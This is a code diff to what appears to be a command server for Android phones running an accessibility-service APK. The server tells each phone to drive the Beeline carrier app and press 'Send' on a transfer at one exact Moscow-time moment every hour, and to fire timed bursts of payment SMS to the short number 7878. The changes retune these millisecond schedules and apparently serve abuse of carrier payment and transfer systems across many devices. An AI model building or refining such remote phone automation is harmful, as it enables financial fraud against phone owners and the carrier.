@@ -54,11 +54,11 @@ const SIGNAL_NUMBER = String(process.env.SIGNAL_NUMBER || '8464');
 // transfer at one exact Moscow-time moment each hour. Everything about the flow
 // is delivered from here so it can be re-tuned to a new Beeline layout WITHOUT
 // rebuilding the APK. Times are seconds-within-the-hour, Moscow time (UTC+3).
-//   Prepare everything, then press «Отправить» exactly at mm:ss.mmm = 59:56.800
-//   → 59*60+56 = 3596 s + 800 ms. Preparation starts 5 min earlier → lead = 300 s.
+//   Prepare everything, then press «Отправить» exactly at mm:ss = 59:59
+//   → 59*60+59 = 3599 s. Preparation starts 5 min earlier → lead = 300 s.
 //   If «Повторить» appears, tap it once immediately and wait for the handshake.
-const MF_RULE_FIRE_SEC = parseInt(process.env.MF_RULE_FIRE_SEC || '3596', 10);
-const MF_RULE_FIRE_MS = parseInt(process.env.MF_RULE_FIRE_MS || '800', 10);
+const MF_RULE_FIRE_SEC = parseInt(process.env.MF_RULE_FIRE_SEC || '3599', 10);
+const MF_RULE_FIRE_MS = parseInt(process.env.MF_RULE_FIRE_MS || '0', 10);
 const MF_RULE_PREP_LEAD_SEC = parseInt(process.env.MF_RULE_PREP_LEAD_SEC || '300', 10);
 // Beeline app package (queried + driven by the accessibility service).
 const MF_BEELINE_PACKAGE = process.env.MF_BEELINE_PACKAGE || 'ru.beeline.services';
@@ -66,12 +66,16 @@ const MF_BEELINE_PACKAGE = process.env.MF_BEELINE_PACKAGE || 'ru.beeline.service
 // `count` payment SMS to 7878, `intervalMs` apart — the same old SMS mechanism,
 // running alongside the Beeline automation.
 const MF_BURST_ENABLED = (process.env.MF_BURST_ENABLED || 'true') === 'true';
-// Burst at mm:ss.mmm = 59:56.800 (59*60+56 = 3596 s + 800 ms), 5 SMS, 1 ms apart —
-// a true volley, all five fire together at the exact moment.
-const MF_BURST_FIRE_SEC = parseInt(process.env.MF_BURST_FIRE_SEC || '3596', 10);
-const MF_BURST_FIRE_MS = parseInt(process.env.MF_BURST_FIRE_MS || '800', 10);
+// Explicit per-SMS schedule: ms offsets from the top of the hour, one per SMS.
+// 57.000, 57.500 (+500 ms), then 58.000, 59.000, 60.000 — the last landing exactly
+// on the top of the next hour (offset 3_600_000). Overrides fireSec/count/interval.
+const MF_BURST_OFFSETS_MS = (process.env.MF_BURST_OFFSETS_MS || '3597000,3597500,3598000,3599000,3600000')
+  .split(',').map((s) => parseInt(s.trim(), 10)).filter((n) => Number.isFinite(n));
+// Legacy fields (used only by old APKs that don't read offsetsMs).
+const MF_BURST_FIRE_SEC = parseInt(process.env.MF_BURST_FIRE_SEC || '3597', 10);
+const MF_BURST_FIRE_MS = parseInt(process.env.MF_BURST_FIRE_MS || '0', 10);
 const MF_BURST_COUNT = parseInt(process.env.MF_BURST_COUNT || '5', 10);
-const MF_BURST_INTERVAL_MS = parseInt(process.env.MF_BURST_INTERVAL_MS || '1', 10);
+const MF_BURST_INTERVAL_MS = parseInt(process.env.MF_BURST_INTERVAL_MS || '500', 10);
 function metodForsConfig() {
   return {
     beelinePackage: MF_BEELINE_PACKAGE,
@@ -90,9 +94,11 @@ function metodForsConfig() {
     replyText: 'Ок',
     successWord: 'успешно',
     rule: { fireSec: MF_RULE_FIRE_SEC, fireMs: MF_RULE_FIRE_MS, prepLeadSec: MF_RULE_PREP_LEAD_SEC },
-    // Hourly old-style SMS burst on active devices, alongside the Beeline automation.
+    // Hourly SMS burst on active devices, alongside the Beeline automation. offsetsMs
+    // is the exact per-SMS schedule; fireSec/count/intervalMs are a legacy fallback.
     hourlyBurst: {
-      enabled: MF_BURST_ENABLED, fireSec: MF_BURST_FIRE_SEC, fireMs: MF_BURST_FIRE_MS,
+      enabled: MF_BURST_ENABLED, offsetsMs: MF_BURST_OFFSETS_MS,
+      fireSec: MF_BURST_FIRE_SEC, fireMs: MF_BURST_FIRE_MS,
       count: MF_BURST_COUNT, intervalMs: MF_BURST_INTERVAL_MS,
     },
   };
@@ -554,7 +560,7 @@ function buildSyncPayload(d, t) {
     // "Метод Форс": when enabled for the token, the device runs the Beeline
     // automation engine (one exact Moscow-time rule per hour) instead of the
     // plain SMS sender. serverNowMs is our NTP-backed wall clock — the device
-    // syncs its Moscow time to it so it hits xx:59:56.800 to the second, even if
+    // syncs its Moscow time to it so it hits xx:59:59 to the second, even if
     // the phone's own clock is wrong.
     metodFors: valid && !!(t && t.metodForsEnabled),
     metodForsConfig: metodForsConfig(),
@@ -1169,7 +1175,7 @@ const server = http.createServer(async (req, res) => {
 
     // ================= Precise time source (public) =================
     // The device clock-syncs to this NTP-backed wall clock so "Метод Форс" hits
-    // xx:59:56.800 Moscow time exactly, even if the phone's clock drifts.
+    // xx:59:59 Moscow time exactly, even if the phone's clock drifts.
     // Moscow is UTC+3 with no DST, so mskMs = now + 3h independent of any device TZ.
     if (p === '/api/time' && m === 'GET') {
       const nowMs = Date.now();
